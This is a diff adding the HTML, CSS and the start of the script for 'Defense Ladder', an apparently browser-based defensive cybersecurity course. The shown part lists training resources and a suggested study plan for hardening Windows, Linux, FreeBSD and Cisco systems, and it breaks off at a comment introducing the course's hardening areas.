@@ -1,0 +1,2082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<!-- tool4that:head -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'sha256-fK9nSBn8qkxxJ9Dy1thMN3MQOXNmbuyysbSx7+/sWPY='; style-src 'unsafe-inline'; img-src data:; font-src data:; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
+<link rel="canonical" href="https://freeapp4that.store/defense-ladder/">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20viewBox%3D%270%200%20100%20100%27%3E%3Ctext%20y%3D%27.9em%27%20font-size%3D%2790%27%3E%F0%9F%8E%93%3C%2Ftext%3E%3C%2Fsvg%3E">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Tool4That">
+<meta property="og:title" content="Defense Ladder">
+<meta property="og:description" content="A four-grade cybersecurity learning ladder, Freshman to Senior, built on Bloom&#x27;s taxonomy and aligned with the NICE Framework and CIS Controls. Concepts first, then quizzes and config-reading drills, then a hardening checklist and study plan you build yourself. Everything stays in your browser.">
+<meta property="og:url" content="https://freeapp4that.store/defense-ladder/">
+<meta property="og:image" content="https://freeapp4that.store/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<!-- /tool4that:head -->
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="Defense Ladder: a free four-grade cybersecurity course, Freshman to Senior, built on Bloom&#x27;s taxonomy. Networking fundamentals, Windows, Linux, FreeBSD and Cisco hardening, investigation basics and ethics. Runs in your browser.">
+<title>Defense Ladder</title>
+<style>
+:root{
+  --bg:#EEF3F5; --paper:#FFFFFF; --paper-2:#F6F9FA; --ink:#10283A; --ink-2:#4A6072; --ink-3:#7A8E9B;
+  --line:#CFDAE1; --line-2:#E3EAEF;
+  --l1:#2A9DB5; --l2:#0B6E8C; --l3:#0E4F6E; --l4:#14213D;
+  --amber:#F2B134; --amber-ink:#5A3E00; --ok:#2E7D4F; --ok-bg:#E4F3EA; --bad:#C8402E; --bad-bg:#FBE6E2;
+  --code-bg:#10283A; --code-ink:#E6F0F5; --code-cmd:#9EE7FF;
+  --accent:var(--l1); --focus:#F2B134;
+  --radius:10px; --shadow:0 1px 2px rgba(16,40,58,.08);
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#0C1A24; --paper:#13283A; --paper-2:#17303F; --ink:#E6EEF3; --ink-2:#A9BCC9; --ink-3:#7F95A5;
+    --line:#27465A; --line-2:#1F3A4B;
+    --l1:#4FC3DB; --l2:#3AA6C6; --l3:#6FA8D8; --l4:#A9B9E8;
+    --amber:#F2B134; --amber-ink:#2B1D00; --ok:#5CC98A; --ok-bg:#153324; --bad:#F08A7A; --bad-bg:#3E1A14;
+    --code-bg:#0A1620; --code-ink:#D8E6EE; --code-cmd:#8EDFFF;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0C1A24; --paper:#13283A; --paper-2:#17303F; --ink:#E6EEF3; --ink-2:#A9BCC9; --ink-3:#7F95A5;
+  --line:#27465A; --line-2:#1F3A4B;
+  --l1:#4FC3DB; --l2:#3AA6C6; --l3:#6FA8D8; --l4:#A9B9E8;
+  --amber:#F2B134; --amber-ink:#2B1D00; --ok:#5CC98A; --ok-bg:#153324; --bad:#F08A7A; --bad-bg:#3E1A14;
+  --code-bg:#0A1620; --code-ink:#D8E6EE; --code-cmd:#8EDFFF;
+}
+*,*::before,*::after{box-sizing:inherit}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+html,body{height:100%}
+body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.55 "Segoe UI","SF Pro Text",-apple-system,system-ui,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+code,kbd,pre,.mono{font-family:ui-monospace,"Cascadia Mono","SF Mono",Menlo,Consolas,"Liberation Mono",monospace}
+a{color:var(--l2);text-decoration-thickness:1px;text-underline-offset:2px}
+:root[data-theme="dark"] a{color:var(--l1)}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]) a{color:var(--l1)}}
+button{font:inherit;color:inherit}
+h1,h2,h3,h4{line-height:1.2;letter-spacing:-.01em;margin:0}
+p{margin:0 0 .8em}
+:focus-visible{outline:3px solid var(--focus);outline-offset:2px}
+.sr{position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden}
+
+/* ---------- shell ---------- */
+.app{display:grid;grid-template-columns:minmax(0,1fr);min-height:100%}
+.rail,.main{min-width:0}
+.rail{background:var(--paper);border-bottom:1px solid var(--line);padding:12px 14px 10px;position:sticky;top:env(safe-area-inset-top,0px);z-index:5}
+.brand{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}
+.brand h1{font-size:1.25rem;font-weight:800}
+.brand .tag{color:var(--ink-2);font-size:.9rem}
+.ladder{display:flex;gap:6px;margin-top:10px;overflow-x:auto;scrollbar-width:none;padding-bottom:2px}
+.ladder::-webkit-scrollbar{display:none}
+.lv{flex:1 0 auto;min-width:112px;display:flex;align-items:center;gap:8px;padding:8px 10px;border:1px solid var(--line);border-radius:var(--radius);background:var(--paper-2);cursor:pointer;text-align:left}
+.lv svg{flex:none}
+.lv .lv-t{display:flex;flex-direction:column;line-height:1.15}
+.lv .lv-g{font-weight:700;font-size:.92rem}
+.lv .lv-p{font-size:.75rem;color:var(--ink-2)}
+.lv[aria-current="true"]{border-color:var(--c);box-shadow:inset 0 0 0 1px var(--c)}
+.pages{display:flex;gap:6px;margin-top:8px;overflow-x:auto;scrollbar-width:none}
+.pages::-webkit-scrollbar{display:none}
+.pg{flex:none;padding:6px 11px;border:1px solid var(--line);background:transparent;border-radius:999px;font-size:.88rem;cursor:pointer;color:var(--ink-2)}
+.pg[aria-current="true"]{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+.rail-foot{display:none}
+
+.main{padding:18px 16px 60px;max-width:76ch;width:100%}
+@media (min-width:920px){
+  .app{grid-template-columns:260px minmax(0,1fr)}
+  .rail{position:sticky;top:0;height:100vh;height:100dvh;border-bottom:0;border-right:1px solid var(--line);padding:22px 18px;display:flex;flex-direction:column;overflow:auto}
+  .brand{flex-direction:column;align-items:flex-start;gap:2px}
+  .brand h1{font-size:1.45rem}
+  .ladder{flex-direction:column;margin-top:22px;overflow:visible}
+  .lv{min-width:0;padding:10px 12px}
+  .pages{flex-direction:column;margin-top:18px;overflow:visible;gap:4px}
+  .pg{text-align:left;border-radius:8px}
+  .rail-foot{display:block;margin-top:auto;padding-top:18px;font-size:.78rem;color:var(--ink-3);line-height:1.4}
+  .main{padding:34px 40px 80px;max-width:calc(76ch + 80px)}
+}
+
+/* ---------- level header ---------- */
+.lvhead{border-left:6px solid var(--accent);padding:4px 0 4px 16px;margin-bottom:18px}
+.lvhead .grade{font-size:2rem;font-weight:800}
+.lvhead .range{color:var(--ink-2);font-size:1.05rem}
+.bloom{display:flex;gap:4px;margin:12px 0 10px;max-width:420px}
+.bloom span{flex:1;height:22px;border-radius:5px;background:var(--line-2);font-size:.68rem;display:flex;align-items:center;justify-content:center;color:var(--ink-3);border:1px solid var(--line)}
+.bloom span.on{background:var(--accent);color:#fff;border-color:var(--accent)}
+:root[data-theme="dark"] .bloom span.on{color:#0C1A24}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]) .bloom span.on{color:#0C1A24}}
+.bloom-cap{font-size:.8rem;color:var(--ink-2)}
+.intro{margin-top:8px}
+details.mentor{margin-top:10px;border:1px dashed var(--line);border-radius:var(--radius);padding:8px 12px;background:var(--paper-2)}
+details.mentor summary{cursor:pointer;font-weight:600;color:var(--ink-2)}
+details.mentor ul{margin:8px 0 2px;padding-left:20px}
+
+.units{display:flex;gap:6px;overflow-x:auto;padding:4px 0 10px;margin-bottom:12px;scrollbar-width:thin}
+.unit{flex:none;border:1px solid var(--line);background:var(--paper);border-radius:999px;padding:7px 12px;cursor:pointer;font-size:.9rem;display:flex;align-items:center;gap:7px}
+.unit[aria-current="true"]{border-color:var(--accent);background:var(--accent);color:#fff}
+:root[data-theme="dark"] .unit[aria-current="true"]{color:#0C1A24}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]) .unit[aria-current="true"]{color:#0C1A24}}
+.unit .dot{width:9px;height:9px;border-radius:50%;background:var(--line);flex:none}
+.unit .dot.part{background:var(--amber)}
+.unit .dot.full{background:var(--ok)}
+.unit[aria-current="true"] .dot{outline:2px solid rgba(255,255,255,.6)}
+
+/* ---------- content ---------- */
+.uhead{margin:6px 0 14px}
+.uhead h2{font-size:1.45rem}
+.uhead .sum{color:var(--ink-2);margin-top:4px}
+.blm{display:inline-block;font-size:.72rem;padding:2px 8px;border-radius:999px;background:var(--line-2);color:var(--ink-2);margin-left:8px;vertical-align:middle}
+.card{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);padding:16px 18px;margin:0 0 14px;box-shadow:var(--shadow)}
+.card h3{font-size:1.08rem;margin-bottom:8px}
+.card h3 .blm{margin-left:8px}
+.card ul,.card ol{margin:0 0 .6em;padding-left:22px}
+.card li{margin:.25em 0}
+.note{border-left:4px solid var(--amber);background:var(--paper-2);padding:10px 12px;border-radius:0 8px 8px 0;margin:10px 0}
+.warn{border-left-color:var(--bad)}
+table.cmds{width:100%;border-collapse:collapse;font-size:.9rem;margin:6px 0 4px;display:block;overflow-x:auto}
+table.cmds td{padding:7px 8px;border-top:1px solid var(--line-2);vertical-align:top}
+table.cmds td:first-child{white-space:nowrap}
+table.cmds code{background:var(--code-bg);color:var(--code-cmd);padding:2px 7px;border-radius:5px;font-size:.84rem}
+pre.term{background:var(--code-bg);color:var(--code-ink);padding:12px 14px;border-radius:8px;overflow-x:auto;font-size:.84rem;line-height:1.5;margin:8px 0}
+p code,li code,.why code{background:var(--line-2);padding:1px 5px;border-radius:4px;font-size:.88em}
+
+.btn{border:1px solid var(--ink);background:var(--ink);color:var(--paper);border-radius:8px;padding:8px 14px;cursor:pointer;font-weight:600}
+.btn.sec{background:transparent;color:var(--ink);border-color:var(--line)}
+.btn.sm{padding:5px 10px;font-size:.85rem}
+.btn:disabled{opacity:.5;cursor:default}
+.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:10px}
+.pill{font-size:.8rem;padding:3px 9px;border-radius:999px;border:1px solid var(--line);color:var(--ink-2)}
+.pill.ok{background:var(--ok-bg);color:var(--ok);border-color:transparent}
+.pill.bad{background:var(--bad-bg);color:var(--bad);border-color:transparent}
+
+/* quiz */
+.q{padding:10px 0;border-top:1px solid var(--line-2)}
+.q:first-of-type{border-top:0}
+.q .qt{font-weight:600;margin-bottom:6px}
+.opt{display:flex;gap:10px;align-items:flex-start;padding:7px 10px;border:1px solid var(--line);border-radius:8px;margin:5px 0;cursor:pointer;background:var(--paper-2)}
+.opt input{margin-top:4px}
+.opt.right{border-color:var(--ok);background:var(--ok-bg)}
+.opt.wrong{border-color:var(--bad);background:var(--bad-bg)}
+.why{font-size:.9rem;color:var(--ink-2);margin:6px 0 0;padding:8px 10px;background:var(--paper-2);border-radius:8px;border:1px dashed var(--line)}
+
+/* flashcards */
+.flash{perspective:1000px}
+.fc{border:1px solid var(--line);border-radius:var(--radius);background:var(--paper-2);min-height:150px;padding:18px;display:flex;align-items:center;justify-content:center;text-align:center;cursor:pointer;font-size:1.05rem;position:relative}
+.fc .side{font-size:.72rem;color:var(--ink-3);position:absolute;top:8px;left:12px}
+.fc .cnt{font-size:.72rem;color:var(--ink-3);position:absolute;top:8px;right:12px}
+.fc.back{background:var(--paper);border-color:var(--accent)}
+
+/* match */
+.match{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.mi{border:1px solid var(--line);border-radius:8px;padding:9px 10px;background:var(--paper-2);cursor:pointer;font-size:.92rem;text-align:left}
+.mi.sel{border-color:var(--accent);box-shadow:inset 0 0 0 1px var(--accent)}
+.mi.done{background:var(--ok-bg);border-color:var(--ok);color:var(--ok);cursor:default}
+.mi.shake{border-color:var(--bad)}
+
+/* spot */
+.spot pre{margin:0;padding:0;background:var(--code-bg);border-radius:8px;overflow-x:auto;font-size:.84rem}
+.sl{display:block;padding:4px 12px;color:var(--code-ink);cursor:pointer;border-left:4px solid transparent;white-space:pre}
+.sl:hover{background:rgba(255,255,255,.06)}
+.sl.flag{border-left-color:var(--amber);background:rgba(242,177,52,.14)}
+.sl.hit{border-left-color:var(--ok);background:rgba(46,125,79,.25)}
+.sl.miss{border-left-color:var(--bad);background:rgba(200,64,46,.25)}
+.sl.false{border-left-color:var(--bad);text-decoration:line-through;opacity:.8}
+.spot .legend{font-size:.8rem;color:var(--ink-2);margin-top:6px}
+
+/* order */
+.ord .pool,.ord .seq{display:flex;flex-direction:column;gap:6px;margin-top:8px}
+.oi{border:1px solid var(--line);border-radius:8px;padding:8px 10px;background:var(--paper-2);cursor:pointer;text-align:left;font-size:.92rem;display:flex;gap:10px;align-items:flex-start}
+.oi .n{flex:none;width:22px;height:22px;border-radius:50%;background:var(--ink);color:var(--paper);font-size:.75rem;display:flex;align-items:center;justify-content:center;font-weight:700}
+.oi.ok{border-color:var(--ok);background:var(--ok-bg)}
+.oi.off{border-color:var(--bad);background:var(--bad-bg)}
+.ord h4{font-size:.85rem;color:var(--ink-2);margin:12px 0 0;font-weight:600}
+
+/* lab */
+.step{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-top:1px solid var(--line-2)}
+.step:first-of-type{border-top:0}
+.step input{margin-top:5px;width:18px;height:18px;flex:none}
+.step .st{flex:1}
+.step code{display:inline-block;margin-top:4px;background:var(--code-bg);color:var(--code-cmd);padding:3px 8px;border-radius:5px;font-size:.84rem;white-space:pre-wrap;word-break:break-word}
+.step.done .st{color:var(--ink-3);text-decoration:line-through}
+.step.done code{opacity:.6}
+
+/* builder, planner, reflect */
+textarea,input[type=text],input[type=number],select{font:inherit;color:var(--ink);background:var(--paper-2);border:1px solid var(--line);border-radius:8px;padding:8px 10px;width:100%}
+textarea{min-height:84px;resize:vertical}
+.bsec{margin:10px 0}
+.bsec label{display:block;font-weight:600;margin-bottom:4px}
+.bsec .hint{font-size:.85rem;color:var(--ink-2);margin-bottom:6px}
+.pl-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.pl-grid label{display:block;font-size:.85rem;color:var(--ink-2)}
+.plan-out{white-space:pre-wrap;font-size:.86rem}
+.timer{font-size:2.4rem;font-weight:800;letter-spacing:.02em;margin:6px 0}
+
+/* links */
+.lk{display:flex;gap:10px;align-items:flex-start;padding:9px 0;border-top:1px solid var(--line-2)}
+.lk:first-of-type{border-top:0}
+.lk .k{flex:none;font-size:.7rem;padding:3px 7px;border-radius:5px;margin-top:3px;min-width:74px;text-align:center;font-weight:600}
+.k.vendor{background:#0B6E8C;color:#fff}
+.k.standard{background:#2E7D4F;color:#fff}
+.k.community{background:#7A5C00;color:#fff}
+.k.practice{background:#6B3FA0;color:#fff}
+.k.tool4that{background:var(--amber);color:var(--amber-ink)}
+.lk .d{font-size:.9rem;color:var(--ink-2)}
+
+/* study plan timeline */
+.tl{position:relative;padding-left:22px}
+.tl::before{content:"";position:absolute;left:8px;top:8px;bottom:8px;width:2px;background:var(--line)}
+.ph{position:relative;padding:0 0 16px}
+.ph::before{content:"";position:absolute;left:-19px;top:7px;width:12px;height:12px;border-radius:50%;background:var(--paper);border:3px solid var(--accent)}
+.ph.ms::before{border-color:var(--ok);background:var(--ok)}
+.ph h3{font-size:1.05rem}
+.ph .when{color:var(--ink-2);font-size:.9rem}
+.ph ul{margin:6px 0 8px;padding-left:20px;font-size:.93rem}
+
+/* hardening areas and scorecard */
+table.areas td:first-child{white-space:normal;min-width:9.5em;width:40%}
+table.areas small{color:var(--ink-2)}
+.sc-lbl{display:block;font-weight:600;margin-bottom:6px}
+.pl-len{display:block;font-size:.85rem;color:var(--ink-2);margin:4px 0 10px;max-width:16rem}
+
+/* progress page */
+.prog{display:grid;gap:10px}
+.pbar{height:10px;background:var(--line-2);border-radius:999px;overflow:hidden;margin:6px 0}
+.pbar i{display:block;height:100%;background:var(--accent);width:0;transition:width .4s}
+.prow{display:flex;justify-content:space-between;align-items:baseline;gap:10px}
+.prow b{font-size:1rem}
+.prow small{color:var(--ink-2)}
+
+.foot{margin-top:36px;font-size:.8rem;color:var(--ink-3);line-height:1.5}
+.theme{position:fixed;right:12px;bottom:calc(12px + env(safe-area-inset-bottom,0px));z-index:9;border:1px solid var(--line);background:var(--paper);border-radius:999px;padding:7px 11px;font-size:.8rem;cursor:pointer;box-shadow:var(--shadow)}
+@media (prefers-reduced-motion:reduce){*{transition:none !important;animation:none !important}}
+</style>
+</head>
+<body>
+<div class="app">
+  <nav class="rail" aria-label="Levels and pages">
+    <div class="brand">
+      <h1>Defense Ladder</h1>
+      <span class="tag">Cybersecurity fundamentals, from first command to team lead</span>
+    </div>
+    <div class="ladder" id="ladder" role="tablist" aria-label="Grade levels"></div>
+    <div class="pages" id="pages"></div>
+    <div class="rail-foot">Unofficial practice; not affiliated with or endorsed by Microsoft, Canonical, Linux Mint, the FreeBSD Project or Cisco. Progress stays in this browser.</div>
+  </nav>
+  <main class="main" id="main" tabindex="-1"></main>
+</div>
+<button class="theme" id="themeBtn" type="button" aria-label="Switch color theme">Theme: auto</button>
+<script>
+/* ===================== Defense Ladder =====================
+   Single-file, offline cybersecurity course: four grades, Freshman to Senior.
+   Content model: LEVELS -> units -> blocks. Interactive blocks carry an id;
+   progress for each id is kept in localStorage (if available).
+   Learning design: Bloom's revised taxonomy (Anderson & Krathwohl, 2001):
+   Remember, Understand, Apply, Analyze, Evaluate, Create.
+   Frameworks: NICE Workforce Framework (work roles), CIS Critical Security
+   Controls v8 (hardening areas), NIST Cybersecurity Framework 2.0.
+   ========================================================== */
+'use strict';
+
+/* ---- block constructors ---- */
+const C=(title,bloom,...parts)=>({t:'c',title,bloom,parts});
+const P=(html)=>({t:'p',html});
+const TIPS=(...items)=>({t:'tips',items});
+const CMDS=(title,rows)=>({t:'cmds',title,rows});
+const TERM=(text)=>({t:'term',text});
+const NOTE=(html,warn)=>({t:'note',html,warn:!!warn});
+const FLASH=(id,title,cards)=>({t:'flash',id,title,cards});
+const QUIZ=(id,title,items)=>({t:'quiz',id,title,items});
+const MATCH=(id,title,intro,pairs)=>({t:'match',id,title,intro,pairs});
+const SPOT=(id,title,intro,lines)=>({t:'spot',id,title,intro,lines});
+const ORDER=(id,title,intro,items)=>({t:'order',id,title,intro,items});
+const LAB=(id,title,intro,steps)=>({t:'lab',id,title,intro,steps});
+const REFLECT=(id,title,prompt)=>({t:'reflect',id,title,prompt});
+const BUILDER=(id,title,intro,sections)=>({t:'builder',id,title,intro,sections});
+const PLANNER=(id)=>({t:'planner',id});
+const TIMER=(id)=>({t:'timer',id});
+const LINKS=(title,keys)=>({t:'links',title,keys});
+
+/* ---- Tool4That hub (edit these if paths change) ---- */
+const HUB='https://freeapp4that.store/';
+
+/* ---- master resource list: key -> [name, url, one-line why, kind] ----
+   kinds: vendor (makers of the software, their own docs and training),
+   standard (consensus or government frameworks and benchmarks),
+   community (free, well-regarded), practice (hands-on platforms),
+   tool4that (practice tools on this site) */
+const RES={
+  'netacad':['Cisco Networking Academy','https://www.netacad.com/','Free self-paced courses from Cisco, from networking basics to cybersecurity. Needs a free account.','vendor'],
+  'pt':['Cisco Packet Tracer','https://www.netacad.com/cisco-packet-tracer','Cisco’s free network simulator: build and configure virtual routers, switches and PCs with the real IOS command line. Download after a free NetAcad sign-up.','vendor'],
+  'ms-win-sec':['Microsoft Learn: Windows security','https://learn.microsoft.com/en-us/windows/security/','Primary source for Defender, firewall, account policy, BitLocker and audit settings.','vendor'],
+  'ms-uac':['Microsoft Learn: User Account Control','https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/','How UAC works, every UAC policy setting, its default, and its registry value.','vendor'],
+  'ms-icacls':['Microsoft Learn: icacls','https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls','Command reference for viewing and changing NTFS permissions, including inheritance flags.','vendor'],
+  'ms-baselines':['Microsoft security baselines','https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/windows-security-baselines','Microsoft’s recommended security settings for Windows and Windows Server. A good seed for your own checklist.','vendor'],
+  'ms-ps':['PowerShell documentation','https://learn.microsoft.com/en-us/powershell/','Every cmdlet, with examples. Search a cmdlet name plus "Microsoft Learn".','vendor'],
+  'ms-sysint':['Sysinternals (Autoruns, Process Explorer, TCPView)','https://learn.microsoft.com/en-us/sysinternals/','Free Microsoft tools for finding persistence and odd processes.','vendor'],
+  'ms-winsrv':['Windows Server documentation','https://learn.microsoft.com/en-us/windows-server/','Active Directory, Group Policy, DNS, DHCP, IIS, roles and features.','vendor'],
+  'ubuntu-sec':['Ubuntu security','https://ubuntu.com/security','Canonical’s security hub: Ubuntu Security Notices, the CVE tracker, and platform security features.','vendor'],
+  'ubuntu-server':['Ubuntu Server documentation','https://ubuntu.com/server/docs','Services, networking, users, ufw and SSH, written by the vendor.','vendor'],
+  'debian-handbook':['The Debian Administrator’s Handbook: Security','https://debian-handbook.info/browse/stable/security.html','Free book listed among Debian’s user manuals. Chapter 14 covers security policy, nftables firewalls, log monitoring and intrusion detection.','vendor'],
+  'debian-security':['Debian Security Information','https://www.debian.org/security/','Debian’s security advisories and how to keep a Debian system patched.','vendor'],
+  'debian-wiki':['Debian Wiki','https://wiki.debian.org/','The Debian project’s community-edited wiki: how-tos for packages and services on current Debian releases.','vendor'],
+  'mint-docs':['Linux Mint documentation','https://linuxmint.com/documentation.php','Installation Guide, User Guide and Troubleshooting Guide from the Linux Mint project.','vendor'],
+  'fbsd':['FreeBSD Handbook','https://docs.freebsd.org/en/books/handbook/','The official book. Chapters on users, security, firewalls (pf, ipfw) and updating.','vendor'],
+  'cis':['CIS Benchmarks','https://www.cisecurity.org/cis-benchmarks','Free (with registration) consensus hardening guides for each OS and many applications. A strong base for a checklist you write yourself.','standard'],
+  'cis-controls':['CIS Critical Security Controls','https://www.cisecurity.org/controls/cis-controls-list','The 18 CIS Controls (v8; v8.1 is the current update): a prioritized list of defensive practices. This course’s six hardening areas map to Controls 4, 5, 6, 7, 8 and 10.','standard'],
+  'stig':['DISA STIGs','https://www.cyber.mil/stigs/','US Department of Defense configuration standards. Dense, but authoritative for Windows, Linux and Cisco.','standard'],
+  'nist-63b':['NIST SP 800-63B-4 (authentication and passwords)','https://pages.nist.gov/800-63-4/sp800-63b.html','The 2025 revision of NIST’s authentication guidance: password length, blocklists, no forced periodic changes, multi-factor authentication.','standard'],
+  'nist-csf':['NIST Cybersecurity Framework 2.0','https://www.nist.gov/cyberframework','Six functions: Govern, Identify, Protect, Detect, Respond, Recover. The shared vocabulary of a security program.','standard'],
+  'nice':['NICE Workforce Framework for Cybersecurity','https://niccs.cisa.gov/tools/nice-framework','Cybersecurity work roles with their tasks, knowledge and skills. Use it to see which jobs each unit of this course leads toward.','standard'],
+  'cisa':['CISA','https://www.cisa.gov/','Advisories, the Known Exploited Vulnerabilities catalog and plain-language security basics from the US cyber defense agency.','standard'],
+  'owasp10':['OWASP Top 10','https://owasp.org/projects/top-ten','The reference list of the most critical web application security risks. The current edition is 2025.','standard'],
+  'juice':['OWASP Juice Shop','https://owasp.org/projects/juice-shop','A deliberately insecure web app for security training that you run on your own machine.','practice'],
+  'bandit':['OverTheWire: Bandit','https://overthewire.org/wargames/bandit/','Linux command line, one level at a time. Start right after the Freshman Linux unit.','practice'],
+  'pico':['picoCTF','https://picoctf.org/','Free, beginner-friendly security challenges and lessons from Carnegie Mellon University (now part of its CyLab Security Academy).','practice'],
+  'ncl':['National Cyber League','https://nationalcyberleague.org/','Virtual, learning-centered cybersecurity competitions for students, with a scouting report of your skills at the end.','practice'],
+  'linuxjourney':['Linux Journey','https://labex.io/linuxjourney','Free, gentle, well-organized Linux lessons. The original linuxjourney.com now lives on LabEx, which also sells paid courses.','community'],
+  'explainshell':['explainshell','https://explainshell.com/','Paste any Linux command and see every argument matched to its help text from the man pages.','community'],
+  'khan':['Khan Academy: Computers and the Internet','https://www.khanacademy.org/computing/computers-and-internet','How computers, networks and the internet work, for beginners.','community'],
+  'eff':['EFF Surveillance Self-Defense','https://ssd.eff.org/','Practical online safety: passwords, two-factor authentication, phishing, privacy.','community'],
+  't4t-subnet':['Subnet Sprint','https://freeapp4that.store/net-drills/subnet-sprint/','Work out network, broadcast and host range for any IPv4 address, then do it faster.','tool4that'],
+  't4t-ios':['IOS CLI Lab','https://freeapp4that.store/net-drills/ios-cli-lab/','Configure a simulated router and switch from their consoles, then prove it from two PCs.','tool4that'],
+  't4t-audit':['Config Audit','https://freeapp4that.store/net-drills/config-audit/','Read a running-config, flag every risky line, choose the best fix, and name the missing protections.','tool4that'],
+  't4t-tickets':['Trouble Tickets','https://freeapp4that.store/net-drills/trouble-tickets/','Read the complaint, study device output, and pick the root cause.','tool4that'],
+  't4t-drills':['Lockdown Drills','https://freeapp4that.store/lockdown-drills/','Baseline-hardening trainers for Windows 11, Windows Server, Linux Mint, Ubuntu, FreeBSD and Cisco IOS, at beginner, intermediate and advanced levels.','tool4that'],
+  't4t-ld-win11':['Lockdown Drills: Windows 11','https://freeapp4that.store/lockdown-drills/windows-11/','Step-by-step Windows 11 hardening drills with the reason behind each command.','tool4that'],
+  't4t-ld-winsrv':['Lockdown Drills: Windows Server','https://freeapp4that.store/lockdown-drills/windows-server/','Hardening drills for Windows Server, Active Directory and Group Policy.','tool4that'],
+  't4t-ld-mint':['Lockdown Drills: Linux Mint','https://freeapp4that.store/lockdown-drills/linux-mint/','Hardening drills for Linux Mint: users, sudo, ufw, updates, services, SSH.','tool4that'],
+  't4t-ld-ubuntu':['Lockdown Drills: Ubuntu','https://freeapp4that.store/lockdown-drills/ubuntu/','Hardening drills for Ubuntu, from accounts to PAM and services.','tool4that'],
+  't4t-ld-fbsd':['Lockdown Drills: FreeBSD','https://freeapp4that.store/lockdown-drills/freebsd/','Hardening drills for FreeBSD: pw, rc.conf, pf and updates.','tool4that'],
+  't4t-ld-ios':['Lockdown Drills: Cisco IOS','https://freeapp4that.store/lockdown-drills/cisco-ios/','Hardening drills for Cisco routers and switches: passwords, SSH, unused ports, ACLs.','tool4that'],
+  't4t-range':['Lockdown Range','https://freeapp4that.store/lockdown-range/','Hands-on labs in your browser, no virtual machine needed: Windows, Linux and a Cisco IOS network. Read the scenario brief, fix the machine, watch the Progress Check.','tool4that'],
+  't4t-lr-win':['Lockdown Range: Windows','https://freeapp4that.store/lockdown-range/windows/','A simulated Windows 11 or Windows Server lab to harden end to end in your browser.','tool4that'],
+  't4t-lr-linux':['Lockdown Range: Linux','https://freeapp4that.store/lockdown-range/linux/','A simulated Ubuntu, Linux Mint or Debian machine to harden from a bash-like terminal.','tool4that'],
+  't4t-lr-ios':['Lockdown Range: Cisco IOS','https://freeapp4that.store/lockdown-range/cisco-ios/','A simulated Cisco topology with IOS consoles and PC terminals, to configure and secure.','tool4that']
+};
+
+/* ---- study plan (a suggested pace; adjust freely) ---- */
+const PLAN={
+  name:'A suggested pace: about two hours a week',
+  phases:[
+    {n:'Phase 1: Foundations',grade:'freshman',when:'Weeks 1 to 4 (Freshman)',ms:false,
+     pts:['Units: authorization and the scenario brief, ethics, security principles, virtualization, first looks at Windows and Linux, networking models.','Set up one Windows and one Linux virtual machine you own, and take a clean snapshot of each.','Alongside: OverTheWire Bandit levels 0 to 5, and Subnet Sprint for binary and masks.']},
+    {n:'Milestone: foundations check',when:'End of week 4',ms:true,
+     pts:['Pass every Freshman quiz. Explain authorization, scope and the CIA triad to someone else in your own words.','List the users, administrators and listening ports on both of your VMs, typing the commands from memory.']},
+    {n:'Phase 2: Hands-on hardening',grade:'sophomore',when:'Weeks 5 to 10 (Sophomore)',ms:false,
+     pts:['Units: the scenario brief, Windows 11 and Linux Mint/Ubuntu hardening by hand, services and ports, first Cisco configurations, investigation questions and the change log.','Practice: Lockdown Drills at beginner level, then the first Lockdown Range scenarios for Windows and Linux.','Keep a change log every session, even when practicing alone.']},
+    {n:'Milestone: first full lab',when:'End of week 10',ms:true,
+     pts:['Harden one Windows and one Linux lab end to end with a change log, without failing an availability check.','Fill in the Hardening scorecard for each machine and note the gaps.']},
+    {n:'Phase 3: Servers and networks',grade:'junior',when:'Weeks 11 to 16 (Junior)',ms:false,
+     pts:['Units: Windows Server and Active Directory, Group Policy, Debian and deeper Linux, VLANs, routing and ACLs, evaluating a configuration.','Practice: intermediate Lockdown Drills, harder Lockdown Range scenarios, Config Audit and Trouble Tickets.','Build a small two-VLAN network in Packet Tracer and route between the VLANs.']},
+    {n:'Milestone: defend your choices',when:'End of week 16',ms:true,
+     pts:['Rank the findings on a lab by impact and explain the order to a peer.','Explain one ACL and one Group Policy setting line by line.']},
+    {n:'Phase 4: Systems and teamwork',grade:'senior',when:'Weeks 17 to 22 (Senior)',ms:false,
+     pts:['Units: FreeBSD, web application security, your own checklist, roles and timing, power and responsibility.','Practice: advanced Lockdown Drills and Lockdown Range scenarios; OWASP Juice Shop on your own machine.','Write a per-OS checklist from standards, with a source for every line.']},
+    {n:'Capstone: timed team session',when:'Week 22 and after',ms:true,
+     pts:['Run a timed practice session as a small team, with a written runbook, a scribe, a timekeeper and your own checklist.','Debrief: what was missed, what broke, what goes on the checklist. Then keep going with picoCTF, the National Cyber League and the NICE Framework work roles that interest you.']}
+  ]
+};
+
+/* ---- the six hardening areas (CIS Critical Security Controls v8) ----
